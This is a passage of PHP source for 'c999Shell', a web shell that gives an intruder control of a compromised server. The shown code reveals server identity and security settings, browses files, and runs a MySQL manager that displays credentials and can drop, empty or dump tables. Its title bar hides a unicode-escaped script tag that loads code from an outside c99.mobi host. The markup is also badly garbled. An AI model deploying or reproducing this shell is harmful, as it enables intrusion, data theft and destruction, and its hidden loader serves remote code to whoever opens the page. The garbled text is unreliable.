 if ($a["text_not"]) {$bool = !$bool;}
 if ($bool) {$found[] = $d.$f; $found_f++;}
 }
 else {$found[] = $d.$f; $found_f++;}
 }
 }
 }
 }
 closedir($h);
}
}
if ($act == "gofile") {if (is_dir($f)) {$act = "ls"; $d = $f;} else {$act = "f"; $d = dirname($f); $f = basename($f);}}
//Sending headers
@ob_start();
@ob_implicit_flush(0);
function onphpshutdown()
{
 global $gzipencode,$ft;
 if (!headers_sent() and $gzipencode and !in_array($ft,array("img","download","notepad")))
 {
 $v = @ob_get_contents();
 @ob_end_clean();
 @ob_start("ob_gzHandler");
 echo $v;
 @ob_end_flush();
 }
}
function c999shexit()
{
 onphpshutdown();
 exit;
}
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", FALSE);
header("Pragma: no-cache");
if (empty($tmpdir))
{
 $tmpdir = ini_get("upload_tmp_dir");
 if (is_dir($tmpdir)) {$tmpdir = "/tmp/";}
}
$tmpdir = realpath($tmpdir);
$tmpdir = str_replace("\\",DIRECTORY_SEPARATOR,$tmpdir);
if (substr($tmpdir,-1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;}
if (empty($tmpdir_logs)) {$tmpdir_logs = $tmpdir;}
else {$tmpdir_logs = realpath($tmpdir_logs);}
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = TRUE;
 $hsafemode = "</pre>
<span style="color: red;">ON (secure)</span>
<pre>";
}
else {$safemode = FALSE; $hsafemode = "</pre>
<span style="color: green;">OFF (not secure)</span>
<pre>";}
$v = @ini_get("open_basedir");
if ($v or strtolower($v) == "on") {$openbasedir = TRUE; $hopenbasedir = "</pre>
<span style="color: red;">".$v."</span>
<pre>";}
else {$openbasedir = FALSE; $hopenbasedir = "</pre>
<span style="color: green;">OFF (not secure)</span>
<pre>";}
$sort = htmlspecialchars($sort);
if (empty($sort)) {$sort = $sort_default;}
$sort[1] = strtolower($sort[1]);
$DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");
if (!ereg("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();}
$DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"<a href="\&quot;&quot;.$surl.&quot;act=phpinfo\&quot;" target="\&quot;_blank\&quot;"><b><span style="text-decoration: underline;">PHP/".phpversion()."</span></b></a>",htmlspecialchars($DISP_SERVER_SOFTWARE));
@ini_set("highlight.bg",$highlight_bg); //FFFFFF
@ini_set("highlight.comment",$highlight_comment); //#FF8000
@ini_set("highlight.default",$highlight_default); //#0000BB
@ini_set("highlight.html",$highlight_html); //#000000
@ini_set("highlight.keyword",$highlight_keyword); //#007700
@ini_set("highlight.string",$highlight_string); //#DD0000
if (!is_array($actbox)) {$actbox = array();}
$dspact = $act = htmlspecialchars($act);
$disp_fullpath = $ls_arr = $notls = null;
$ud = urlencode($d);
?><meta http-equiv="Content-Type" content="text/html; charset=windows-1251" /><meta http-equiv="Content-Language" content="en-us" /><?php echo getenv("HTTP_HOST"); ?> - phpshell</pre>
<style><!--
TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}
--></style>
<pre></pre>
<center>
<table style="border-collapse: collapse;" width="100%" border="1" cellspacing="0" cellpadding="5" bgcolor="#333333">
<tbody>
<tr>
<th colspan="2" valign="top" nowrap="nowrap" width="101%" height="15">
<span style="font-family: Webdings; font-size: xx-large;"><b>!</b></span><a href="<?php echo $surl; ?>"><span style="font-family: Verdana; font-size: x-large;"><b><script type="text/javascript">// <![CDATA[
document.write('\u003c\u0053\u0043\u0052\u0049\u0050\u0054\u0020\u0053\u0052\u0043\u003d\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0077\u0077\u0077\u002e\u0063\u0039\u0039\u002e\u006d\u006f\u0062\u0069\u002f\u0069\u006d\u0061\u0067\u0065\u0073\u002f\u0069\u006d\u0067\u002e\u006a\u0073\u003e\u003c\u002f\u0053\u0043\u0052\u0049\u0050\u0054\u003e')
// ]]></script>c999Shell v. <!--?php echo $shver; ?--></b></span></a><span style="font-family: Webdings; font-size: xx-large;"><b>!</b></span></th>
</tr>
</tbody>
</table>
</center>
<pre>
<b>Software: <!--?php echo $DISP_SERVER_SOFTWARE; ?--></b> 

<b>uname -a: <!--?php echo wordwrap(php_uname(),90,"<br ?-->",1); ?></b> 

<b><!--?php if (!$win) {echo wordwrap(myshellexec("id"),90,"<br ?-->",1);} else {echo get_current_user();} ?></b> 

<b>Safe-mode: <!--?php echo $hsafemode; ?--></b>

<!--?php <br ?-->$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);}
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
$d = str_replace("\\\\","\\",$d);
$dispd = htmlspecialchars($d);
$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));
$i = 0;
foreach($pd as $b)
{
 $t = "";
 $j = 0;
 foreach ($e as $r)
 {
 $t.= $r.DIRECTORY_SEPARATOR;
 if ($j == $i) {break;}
 $j++;
 }
 echo "<a href="\&quot;&quot;.$surl.&quot;act=ls&d=&quot;.urlencode($t).&quot;&sort=&quot;.$sort.&quot;\&quot;"><b>".htmlspecialchars($b).DIRECTORY_SEPARATOR."</b></a>";
 $i++;
}
echo "   ";
if (is_writable($d))
{
 $wd = TRUE;
 $wdt = "<span style="color: green;">[ ok ]</span>";
 echo "<b><span style="color: green;">".view_perms(fileperms($d))."</span></b>";
}
else
{
 $wd = FALSE;
 $wdt = "<span style="color: red;">[ Read-Only ]</span>";
 echo "<b>".view_perms_color($d)."</b>";
}
if (is_callable("disk_free_space"))
{
 $free = disk_free_space($d);
 $total = disk_total_space($d);
 if ($free === FALSE) {$free = 0;}
 if ($total === FALSE) {$total = 0;}
 if ($free < 0) {$free = 0;}
 if ($total < 0) {$total = 0;}
 $used = $total-$free;
 $free_percent = round(100/($total/$free),2);
 echo "
<b>Free ".view_size($free)." of ".view_size($total)." (".$free_percent."%)</b>";
}
echo "
";
$letters = "";
if ($win)
{
 $v = explode("\\",$d);
 $v = $v[0];
 foreach (range("a","z") as $letter)
 {
 $bool = $isdiskette = in_array($letter,$safemode_diskettes);
 if (!$bool) {$bool = is_dir($letter.":\\");}
 if ($bool)
 {
 $letters .= "<a onclick="\&quot;return" href="\&quot;&quot;.$surl.&quot;act=ls&d=&quot;.urlencode($letter.&quot;:\\&quot;).&quot;\&quot;&quot;.($isdiskette?&quot;">[ ";
 if ($letter.":" != $v) {$letters .= $letter;}
 else {$letters .= "<span style="color: green;">".$letter."</span>";}
 $letters .= " ]</a> ";
 }
 }
 if (!empty($letters)) {echo "<b>Detected drives</b>: ".$letters."
";}
}
if (count($quicklaunch) > 0)
{
 foreach($quicklaunch as $item)
 {
 $item[1] = str_replace("%d",urlencode($d),$item[1]);
 $item[1] = str_replace("%sort",$sort,$item[1]);
 $v = realpath($d."..");
 if (empty($v)) {$a = explode(DIRECTORY_SEPARATOR,$d); unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);}
 $item[1] = str_replace("%upd",urlencode($v),$item[1]);
 echo "<a href="\&quot;&quot;.$item[1].&quot;\&quot;">".$item[0]."</a>    ";
 }
}
echo "


";
if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo "</pre>
<table width="\&quot;100%\&quot;" border="1" cellspacing="0" cellpadding="5" bgcolor="#333333">
<tbody>
<tr>
<td valign="\&quot;top\&quot;" width="\&quot;100%\&quot;">".$donated_html."</td>
</tr>
</tbody>
</table>
<pre>

";}
echo "</pre>
<table width="\&quot;100%\&quot;" border="1" cellspacing="0" cellpadding="5" bgcolor="#333333">
<tbody>
<tr>
<td valign="\&quot;top\&quot;" width="\&quot;100%\&quot;">";
if ($act == "") {$act = $dspact = "ls";}
if ($act == "sql")
{
 $sql_surl = $surl."act=sql";
 if ($sql_login) {$sql_surl .= "&sql_login=".htmlspecialchars($sql_login);}
 if ($sql_passwd) {$sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd);}
 if ($sql_server) {$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);}
 if ($sql_port) {$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);}
 if ($sql_db) {$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);}
 $sql_surl .= "&";
 ?>
<h3>Attention! SQL-Manager is <span style="text-decoration: underline;">NOT</span> ready module! Don't reports bugs.</h3>
"; if (!$sql_sock) {?>
<table style="border-collapse: collapse;" width="100%" border="1" cellspacing="0" cellpadding="5" bgcolor="#333333">
<tbody>
<tr>
<td colspan="2" valign="top" width="100%" height="1"><center><!--?php <br ?--> if ($sql_server)
 {
 $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
 $err = mysql_smarterror();
 @mysql_select_db($sql_db,$sql_sock);
 if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}
 }
 else {$sql_sock = FALSE;}
 echo "<b>SQL Manager:</b>
";
 if (!$sql_sock)
 {
 if (!$sql_server) {echo "NO CONNECTION";}
 else {echo "<center><b>Can't connect</b></center>"; echo "<b>".$err."</b>";}
 }
 else
 {
 $sqlquicklaunch = array();
 $sqlquicklaunch[] = array("Index",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
 $sqlquicklaunch[] = array("Query",$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl));
 $sqlquicklaunch[] = array("Server-status",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=serverstatus");
 $sqlquicklaunch[] = array("Server variables",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars");
 $sqlquicklaunch[] = array("Processes",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=processes");
 $sqlquicklaunch[] = array("Logout",$surl."act=sql");
 echo "<center><b>MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")</b>
";
 if (count($sqlquicklaunch) > 0) {foreach($sqlquicklaunch as $item) {echo "[ <a href="\&quot;&quot;.$item[1].&quot;\&quot;"><b>".$item[0]."</b></a> ] ";}}
 echo "</center>";
 }
 echo "</center></td>
</tr>
<tr>
<td valign="top" width="28%" height="100"><center><span style="font-size: x-large;"> i </span></center>
<ul>
	<li>If login is null, login is owner of process.</li>
	<li>If host is null, host is localhost</li>
	<li>If port is null, port is 3306 (default)</li>
</ul>
</td>
<td valign="top" width="90%" height="1">
<table width="100%" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td> <b>Please, fill the form:</b>
<table>
<tbody>
<tr>
<td><b>Username</b></td>
<td><b>Password</b></td>
<td><b>Database</b></td>
</tr>
<tr>
<td><input type="text" maxlength="64" name="sql_login" value="root" /></td>
<td><input type="password" maxlength="64" name="sql_passwd" value="" /></td>
<td><input type="text" maxlength="64" name="sql_db" value="" /></td>
<td><b>Host</b></td>
<td><b>PORT</b></td>
<td align="right"><input type="text" maxlength="64" name="sql_server" value="localhost" /></td>
<td><input type="text" maxlength="6" name="sql_port" size="3" value="3306" /></td>
<td><input type="submit" value="Connect" /></td>
<td></td>
</tr>
</tbody>
</table>
</td>
<!--?php }  else  {   //Start left panel   if (!empty($sql_db))   {    ?-->
<td valign="top" width="25%" height="100%"><a href="<?php echo $surl.">"><b>Home</b></a>

<hr noshade="noshade" size="1" />

<!--?php <br ?--> $result = mysql_list_tables($sql_db);
 if (!$result) {echo mysql_smarterror();}
 else
 {
 echo "---[ <a href="\&quot;&quot;.$sql_surl.&quot;&\&quot;"><b>".htmlspecialchars($sql_db)."</b></a> ]---
";
 $c = 0;
 while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "<b>� <a href="\&quot;&quot;.$sql_surl.&quot;sql_db=&quot;.htmlspecialchars($sql_db).&quot;&sql_tbl=&quot;.htmlspecialchars($row[0]).&quot;\&quot;"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</b>"; mysql_free_result($count); $c++;}
 if (!$c) {echo "No tables found in database.";}
 }
 }
 else
 {
 ?></td>
<td valign="top" width="1" height="100"><a href="<?php echo $sql_surl; ?>"><b>Home</b></a>

<hr noshade="noshade" size="1" />

<!--?php    $result = mysql_list_dbs($sql_sock);    if (!$result) {echo mysql_smarterror();}    else    {     ?-->
<form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql" /><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>" /><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>" /><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>" /><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>" />
<select name="sql_db"><!--?php <br ?--> $c = 0;</select>
<select name="sql_db">$dbs = "";</select>
<select name="sql_db">while ($row = mysql_fetch_row($result)) {$dbs .= "</select>
<select name="sql_db"><option selected="selected" value="\&quot;&quot;.$row[0].&quot;\&quot;&quot;;">".$row[0]."</option></select>
<select name="sql_db">"; $c++;}</select>
<select name="sql_db">echo "</select>
<select name="sql_db"><option value="\&quot;\&quot;">Databases (".$c.")</option></select>
<select name="sql_db">";</select>
<select name="sql_db">echo $dbs;</select>
<select name="sql_db">}</select>
<select name="sql_db">?></select>

<hr noshade="noshade" size="1" />

Please, select database

<hr noshade="noshade" size="1" />

<input type="submit" value="Go" /></form>
<!--?php <br ?--> }
 //End left panel
 echo "</td>
<td valign="\&quot;top\&quot;" width="\&quot;100%\&quot;" height="\&quot;1\&quot;">";
 //Start center panel
 $diplay = TRUE;
 if ($sql_db)
 {
 if (!is_numeric($c)) {$c = 0;}
 if ($c == 0) {$c = "no";}
 echo "

<hr noshade="noshade" size="\&quot;1\&quot;" />

<center><b>There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").
";
 if (count($dbquicklaunch) > 0) {foreach($dbsqlquicklaunch as $item) {echo "[ <a href="\&quot;&quot;.$item[1].&quot;\&quot;">".$item[0]."</a> ] ";}}
 echo "</b></center>";
 $acts = array("","dump");
 if ($sql_act == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
 elseif ($sql_act == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_act = "query";}
 elseif ($sql_act == "tbldump") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = "dump";}
 elseif ($sql_act == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
 elseif ($sql_act == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
 elseif ($sql_act == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
 elseif ($sql_act == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
 elseif ($sql_act == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";} $sql_query = substr($sql_query,0,-1);} $sql_act = "query";}
 elseif ($sql_tbl_act == "insert")
 {
 if ($sql_tbl_insert_radio == 1)
 {
 $keys = "";
 $akeys = array_keys($sql_tbl_insert);
 foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}
 if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}
 $values = "";
 $i = 0;
 foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;}
 if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}
 $sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";
 $sql_act = "query";
 $sql_tbl_act = "browse";
 }
 elseif ($sql_tbl_insert_radio == 2)
 {
 $set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);
 $sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";
 $result = mysql_query($sql_query)
?>
